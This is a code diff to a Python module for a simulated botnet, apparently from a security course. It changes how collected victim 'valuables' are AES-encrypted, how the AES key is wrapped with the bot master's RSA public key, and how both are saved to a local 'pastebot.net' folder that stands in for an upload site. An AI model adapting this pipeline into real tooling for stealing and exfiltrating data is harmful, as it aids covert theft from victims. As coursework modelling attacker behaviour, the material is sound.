@@ -28,7 +28,7 @@ def ANSI_X923_pad(m, pad_length):
 def save_valuable(data):
     valuables.append(data)
 
-def encrypt_for_master(data):
+def encrypt_for_master(data, f):
     # Encrypt the file so it can only be read by the bot master
 
     # Generate key and IV for AES encryption with 256bits key size
@@ -36,7 +36,7 @@ def encrypt_for_master(data):
     iv = Random.get_random_bytes(AES.block_size)
     cipher = AES.new(aes_encryption_key, AES.MODE_CBC, iv)
 
-    padded_data = ANSI_X923_pad(bytes(str(data), 'ascii'), AES.block_size)
+    padded_data = ANSI_X923_pad(bytes(str(data), 'ascii') + iv, AES.block_size)
     encrypted_data = cipher.encrypt(padded_data)
 
     # print(data)  # Test print. TO BE REMOVE
@@ -46,17 +46,25 @@ def encrypt_for_master(data):
     # Obtain public key from text file for encrypting aes encryption key
     pub_key = open("mypublickey.txt", "r").read()
     rsa_encryption_key = RSA.importKey(pub_key)
-    encrypt_key = rsa_encryption_key.encrypt(aes_encryption_key, 16)  # Encrypting aes key
-    print(encrypt_key)
+    encrypt_aes_key = rsa_encryption_key.encrypt(aes_encryption_key, 16)  # Encrypting aes key
+    print(encrypt_aes_key)
+
+    aes_key_file = os.path.join("pastebot.net", f + ".AES.key")
+    out = open(aes_key_file, "wb")
+    out.write(encrypt_aes_key[0])
+    out.close()
+
+    print("Exported AES key!")
+
     return encrypted_data
 
-encrypt_for_master("Attack at dawn") # Test print. TO BE REMOVE
+# encrypt_for_master("Attack at dawn") # Test print. TO BE REMOVE
 
 def upload_valuables_to_pastebot(fn):
     # Encrypt the valuables so only the bot master can read them
     valuable_data = "\n".join(valuables)
     valuable_data = bytes(valuable_data, "ascii")
-    encrypted_master = encrypt_for_master(valuable_data)
+    encrypted_master = encrypt_for_master(valuable_data, fn)
 
     # "Upload" it to pastebot (i.e. save in pastebot folder)
     f = open(os.path.join("pastebot.net", fn), "wb")
